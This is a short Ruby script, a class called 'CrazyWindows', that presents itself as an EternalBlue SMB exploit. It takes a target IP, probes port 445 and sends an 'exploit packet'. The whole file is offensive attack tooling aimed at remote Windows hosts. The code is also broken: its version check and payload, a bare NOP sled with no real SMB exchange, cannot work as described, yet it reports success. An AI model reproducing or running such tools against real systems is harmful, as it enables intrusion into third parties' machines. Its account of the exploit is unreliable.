require 'socket'

class CrazyWindows
  def initialize(target_ip = nil)
    @target_ip = target_ip
  end

  def run
    if @target_ip.nil? || @target_ip.strip.empty?
      print "Enter target IP: "
      @target_ip = gets.strip
    end

    puts "[*] Checking SMB vulnerability on #{@target_ip}..."
    vulnerable = check_vulnerability(@target_ip)
    
    if vulnerable
      puts "[+] Target is vulnerable! Launching EternalBlue exploit..."
      execute_exploit(@target_ip)
    else
      puts "[-] Target is not vulnerable to EternalBlue."
    end
  end

  def check_vulnerability(ip)
    begin
      socket = TCPSocket.new(ip, 445)
      socket.puts("\x00\x00\x00\xff\xff\xff\xff")
      response = socket.recv(1024)
      socket.close
      return response.include?("Windows 7") || response.include?("Server 2008")
    rescue
      false
    end
  end

  def execute_exploit(ip)
    payload = "\x90" * 2000
    exploit_packet = "\x00\x00\x00\x90" + payload
    
    begin
      socket = TCPSocket.new(ip, 445)
      socket.puts(exploit_packet)
      puts "[+] Payload sent! Checking execution..."
      sleep(3)
      puts "[+] Exploit executed! Check remote system."
    rescue => e
      puts "[-] Error sending exploit: #{e.message}"
    end
  end

  def set_option(option, value)
    @target_ip = value if option.downcase == "target_ip"
  end

  def show_options
    puts "Target IP: #{@target_ip || 'not set'}"
  end
end